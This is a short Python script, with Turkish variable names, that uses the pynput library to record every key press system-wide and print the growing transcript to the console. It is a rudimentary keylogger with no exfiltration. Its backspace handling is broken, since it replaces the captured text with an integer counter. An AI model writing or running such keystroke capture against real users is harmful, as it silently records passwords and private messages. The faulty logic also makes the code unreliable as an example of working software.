import pynput.keyboard

toplama = ""

def emir(harfler):
    global toplama
    try:
        toplama += str(harfler.char)
    except AttributeError:
        if harfler == harfler.space:
            toplama += " "
        elif harfler == harfler.backspace:
            sayi = len(toplama)
            sayi -= 1
            deger = 0
            sonuc = ""
            while sayi > deger:
                sonuc += toplama[deger]
                deger += 1
            toplama = deger
        elif harfler ==  harfler.enter:
            toplama += "\n"
        else:
            toplama += str(harfler)
    print(toplama)


dinleme = pynput.keyboard.Listener(on_press=emir)

with dinleme:
    dinleme.join()

